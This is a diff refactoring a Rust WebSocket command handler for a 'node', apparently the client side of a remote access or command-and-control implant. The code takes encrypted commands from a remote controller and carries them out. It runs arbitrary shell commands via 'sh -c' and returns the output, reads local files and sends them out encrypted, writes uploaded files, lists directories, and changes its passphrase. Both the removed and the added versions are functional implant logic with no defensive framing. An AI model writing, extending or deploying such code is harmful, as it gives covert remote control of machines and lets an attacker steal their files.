@@ -1,5 +1,4 @@
 use std::sync::Arc;
-
 use futures_util::stream::{SplitSink, SplitStream, StreamExt};
 use tokio::fs;
 use tokio::net::TcpStream;
@@ -8,12 +7,9 @@ use tokio::sync::Mutex;
 use tokio_tungstenite::tungstenite::Message;
 use tokio_tungstenite::WebSocketStream;
 use crate::communication;
-use crate::compression;
 use crate::crypto;
+use crate::command::{Command as NodeCommand, Response};
 
-/*
-  This is what happens when node receives a command.
-*/
 pub struct RxCommandHandler {
     passphrase: String,
     ws_sender: Option<Arc<Mutex<SplitSink<WebSocketStream<TcpStream>, Message>>>>,
@@ -29,157 +25,138 @@ impl RxCommandHandler {
         RxCommandHandler { passphrase, ws_sender, ws_receiver }
     }
 
-    pub async fn handle_command(&self, command: &str) {
-        let parts: Vec<&str> = command.split_whitespace().collect();
-        let cmd = parts.get(0).unwrap_or(&"");
-        let args = &parts[1..].join(" ");
-
-        match cmd.to_uppercase().as_str() {
-            "ECHO" | "PRINT" | "MSG" => self.print_message(args).await,
-            "LIST" | "LS" => self.list_files().await,
-            "GET" | "DOWNLOAD" => self.download_file(args).await,
-            "PUT" | "UPLOAD" => self.upload_file(args).await,
-            "SHELL" | "EXEC" | "RUN" => self.execute_command(args).await,
-            "PASSPHRASE" => self.change_passphrase(args).await,
-            "PROXY" => self.proxy_to_server(args).await,
-            "EXIT" => self.exit_proxy_mode().await,
-            _ => eprintln!("Unknown command: {}", command),
+    pub async fn handle_command(&mut self, command: NodeCommand) -> Response {
+        match command {
+            NodeCommand::Echo { message } => self.echo_message(&message).await,
+            NodeCommand::ListFiles => self.list_files().await,
+            NodeCommand::GetFile { file_path } => self.download_file(&file_path).await,
+            NodeCommand::PutFile { file_path, data } => self.upload_file(&file_path, &data).await,
+            NodeCommand::Execute { command } => self.execute_command(&command).await,
+            NodeCommand::ChangePassphrase { new_passphrase } => self.change_passphrase(&new_passphrase).await,
+            NodeCommand::ProxyToServer { server_address } => self.proxy_to_server(&server_address).await,
+            NodeCommand::ExitProxyMode => self.exit_proxy_mode().await,
         }
     }
-
-    async fn print_message(&self, message: &str) {
-        println!("[+] {:?}", message);
+    
+    async fn echo_message(&self, message: &str) -> Response {
+        Response::Message { content: format!("[+] {}", message) }
     }
 
-    async fn list_files(&self) {
-        let entries = fs::read_dir(".").await.expect("Failed to read directory");
-        let mut file_list = String::new();
-
-        for entry in entries {
-            let entry = entry.expect("Failed to read entry");
-            let path = entry.path();
-            if let Some(file_name) = path.file_name() {
-                file_list.push_str(&format!("{}\n", file_name.to_string_lossy()));
+    async fn list_files(&self) -> Response {
+        let mut file_list = vec![];
+    
+        match fs::read_dir(".").await {
+            Ok(mut entries) => {
+                while let Ok(Some(entry)) = entries.next_entry().await {
+                    if let Some(file_name) = entry.file_name().to_str() {
+                        file_list.push(file_name.to_string());
+                    }
+                }
+            }
+            Err(e) => {
+                eprintln!("Failed to read directory: {}", e);
             }
         }
-
-        if let Some(ws_sender) = &self.ws_sender {
-            let mut sender = ws_sender.lock().await;
-            communication::send_binary_data(&mut sender, file_list.into_bytes()).await;
-        }
+    
+        Response::FileList { files: file_list }
     }
-
-    async fn download_file(&self, file_path: &str) {
+    
+    async fn download_file(&self, file_path: &str) -> Response {
         match fs::read(file_path).await {
             Ok(file_data) => {
-                let compressed_data = compression::compress(&file_data);
-                let encrypted_data = crypto::encrypt(&compressed_data, self.passphrase.as_bytes());
-
-                if let Some(ws_sender) = &self.ws_sender {
-                    let mut sender = ws_sender.lock().await;
-                    communication::send_binary_data(&mut sender, encrypted_data).await;
-                }
+                let encrypted_data = crypto::encrypt(&file_data, self.passphrase.as_bytes());
+                Response::FileData { file_path: file_path.to_string(), data: encrypted_data }
             }
-            Err(e) => eprintln!("Failed to read file {}: {}", file_path, e),
+            Err(e) => {
+                eprintln!("Failed to read file {}: {}", file_path, e);
+                Response::Message { content: format!("Failed to read file: {}", e) }
+            }
         }
     }
 
-    async fn upload_file(&self, args: &str) {
-        let mut parts = args.split_whitespace();
-        let file_path = match parts.next() {
-            Some(path) => path,
-            None => {
-                eprintln!("No file path specified for upload.");
-                return;
+    async fn upload_file(&self, file_path: &str, data: &[u8]) -> Response {
+        let decrypted_data = crypto::decrypt(data, self.passphrase.as_bytes());
+        match fs::write(file_path, decrypted_data).await {
+            Ok(_) => Response::Message { content: format!("File {} uploaded successfully.", file_path) },
+            Err(e) => {
+                eprintln!("Failed to write file {}: {}", file_path, e);
+                Response::Message { content: format!("Failed to write file: {}", e) }
             }
-        };
-
-        let file_data = match parts.next() {
-            Some(data) => data.as_bytes().to_vec(),
-            None => {
-                eprintln!("No file data specified for upload.");
-                return;
-            }
-        };
-
-        let binary_data = communication::decrypt_binary_data(file_data, &self.passphrase);
-
-        match fs::write(file_path, binary_data).await {
-            Ok(_) => eprintln!("File {} uploaded successfully.", file_path),
-            Err(e) => eprintln!("Failed to write file {}: {}", file_path, e),
         }
     }
 
-    async fn execute_command(&self, command: &str) {
-        let output = Command::new("sh")
-            .arg("-c")
-            .arg(command)
-            .output()
-            .await
-            .expect("Failed to execute command");
+    async fn execute_command(&self, command: &str) -> Response {
+        match Command::new("sh").arg("-c").arg(command).output().await {
+            Ok(output) => {
+                let result = String::from_utf8_lossy(&output.stdout);
+                Response::CommandOutput { output: result.to_string() }
+            }
+            Err(e) => {
+                eprintln!("Failed to execute command: {}", e);
+                Response::Message { content: format!("Failed to execute command: {}", e) }
+            }
+        }
+    }
 
-        let result = String::from_utf8_lossy(&output.stdout);
+    async fn change_passphrase(&mut self, new_passphrase: &str) -> Response {
+        self.passphrase = new_passphrase.to_string();
+        Response::Message { content: "Passphrase changed successfully.".to_string() }
+    }
 
+    async fn proxy_to_server(&self, _server_address: &str) -> Response {
+        // Implement proxy logic if needed
+        Response::Message { content: "Proxy feature not implemented.".to_string() }
+    }
+
+    async fn exit_proxy_mode(&self) -> Response {
+        // Implement exit proxy logic if needed
+        Response::Message { content: "Exit proxy mode not implemented.".to_string() }
+    }
+
+    async fn send_response(&self, response: Response) {
         if let Some(ws_sender) = &self.ws_sender {
             let mut sender = ws_sender.lock().await;
-            communication::send_message(&mut sender, &self.passphrase, &result).await;
+            let serialized_response = serde_json::to_vec(&response).expect("Failed to serialize response");
+            let encrypted_response = crypto::encrypt(&serialized_response, self.passphrase.as_bytes());
+            communication::send_binary_data(&mut sender, encrypted_response).await;
         }
     }
 
-    async fn change_passphrase(&self, new_passphrase: &str) {
-        // Update local passphrase
-        self.passphrase = new_passphrase.to_string();
-    }
-
-    async fn proxy_to_server(&self, server_address: &str) {
-        let (ws_stream, _) = tokio_tungstenite::connect_async(server_address)
-            .await
-            .expect("Failed to connect to proxy server");
-
-        let (proxy_sender, mut proxy_receiver) = ws_stream.split();
-
-        if let Some(ws_sender) = &self.ws_sender {
-            let mut client_sender = ws_sender.lock().await;
-
-            tokio::spawn(async move {
-                while let Some(message) = proxy_receiver.next().await {
-                    if let Ok(msg) = message {
-                        client_sender.send(msg).await.expect("Failed to send message to client");
-                    }
+    pub async fn handle_rx(&mut self) {
+        while let Some(message) = self.get_next_message().await {
+            match message {
+                Ok(Message::Binary(data)) => {
+                    let response = self.process_binary_message(data).await;
+                    self.send_response(response).await;
                 }
-            });
-
-            tokio::spawn(async move {
-                while let Some(message) = client_sender.next().await {
-                    if let Ok(msg) = message {
-                        proxy_sender.send(msg).await.expect("Failed to send message to proxy");
-                    }
+                Ok(Message::Text(text)) => {
+                    eprintln!("Unexpected text message: {}", text);
                 }
-            });
-        }
-    }
-
-    async fn exit_proxy_mode(&self) {
-        // Exit proxy mode and return to the previous connection
-        // This would be more complex depending on your actual connection management
-    }
-
-    pub async fn handle_responses(&mut self) {
-        if let Some(ws_receiver) = &mut self.ws_receiver {
-            while let Some(message) = ws_receiver.next().await {
-                match message {
-                    Ok(Message::Binary(data)) => {
-                        self.handle_binary_response(data).await;
-                    }
-                    _ => eprintln!("Unexpected WebSocket message"),
+                Ok(_) => {
+                    eprintln!("Received unexpected non-binary message");
+                }
+                Err(e) => {
+                    eprintln!("Error receiving WebSocket message: {}", e);
+                    break;
                 }
             }
         }
     }
-
-    async fn handle_binary_response(&self, data: Vec<u8>) {
-        let command: Vec<u8> = communication::prepare_rx(data, &self.passphrase);
-        let command_str = String::from_utf8_lossy(&command);
-        self.handle_command(&command_str).await;
+    
+    async fn get_next_message(&self) -> Option<Result<Message, tokio_tungstenite::tungstenite::Error>> {
+        if let Some(ws_receiver) = &self.ws_receiver {
+            let mut receiver = ws_receiver.lock().await;
+            receiver.next().await
+        } else {
+            None
+        }
+    }
+    
+    async fn process_binary_message(&mut self, data: Vec<u8>) -> Response {
+        let decrypted_data = communication::prepare_rx(data, &self.passphrase);
+        let command: NodeCommand = serde_json::from_slice(&decrypted_data)
+            .expect("Failed to deserialize command");
+    
+        self.handle_command(command).await
     }
 }
